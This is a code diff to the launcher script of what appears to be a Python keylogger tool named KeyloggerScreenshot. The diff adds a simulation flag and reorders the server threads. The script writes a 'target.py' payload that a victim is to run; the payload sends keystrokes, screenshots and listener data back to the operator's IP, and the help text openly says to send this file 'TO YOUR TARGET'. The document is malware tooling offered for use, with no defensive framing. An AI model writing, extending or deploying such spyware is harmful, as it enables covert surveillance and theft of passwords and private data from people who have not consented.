@@ -23,6 +23,8 @@ try:
     if "-aip" in lst: #"aip" stands for address ip
         idx = lst.index("-aip")
         try:
+            global simulation
+            global boolean
             ipaddress = str(lst[idx+1])
             zahlen = "123456789"
             nummer = 0
@@ -36,6 +38,19 @@ try:
             port_keylogger = int(port_numbers[1])
             port_listener = int(port_numbers[2])
             port_time = int(port_numbers[3])
+
+            if "-sim" in lst:
+                try:
+                    print("The simulation is activated")
+                    simulation = "simulater=True"
+                    boolean = True
+
+                except IndexError:
+                    quit()
+            else:
+                simulation = "simulater=False"
+                boolean = False
+
             if "-ds" in lst:  # "ds" for demon server
                 try:
                     server_code = f'''
@@ -46,7 +61,7 @@ ip = "{ipaddress}"
 
 server_photos = ks.ServerPhotos(ip, {port_photos})
 
-server_keylogger = ks.ServerKeylogger(ip, {port_keylogger})
+server_keylogger = ks.ServerKeylogger(ip, {port_keylogger}, {simulation})
 
 server_listener = ks.ServerListener(ip, {port_listener})
 
@@ -115,17 +130,17 @@ threading_server4.start() '''
                         os.remove(filename)
 
                     with open(f"{filename}", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
+                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                     print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
+                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
 
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
 
-            server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger)
+            server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger, simulater=boolean)
 
             server_listener = ks.ServerListener(ipaddress, port_listener)
 
@@ -134,14 +149,15 @@ threading_server4.start() '''
             threading_server = threading.Thread(target=server_photos.start)
             threading_server.start()
 
-            threading_server2 = threading.Thread(target=server_keylogger.start)
-            threading_server2.start()
-
             threading_server3 = threading.Thread(target=server_listener.start)
             threading_server3.start()
 
             threading_server4 = threading.Thread(target=server_time.start_timer)
             threading_server4.start()
+
+            threading_server2 = threading.Thread(target=server_keylogger.start)
+            threading_server2.start()
+            threading_server2.join()
 
         except IndexError:
             print(gui)
@@ -153,8 +169,7 @@ threading_server4.start() '''
 
     if "-help" in lst:
         print(gui)
-        print("-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET")
+        print("\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION")
 
 except OSError:
-    print(gui)
     print("CHECK YOUR IP-ADDRESS")
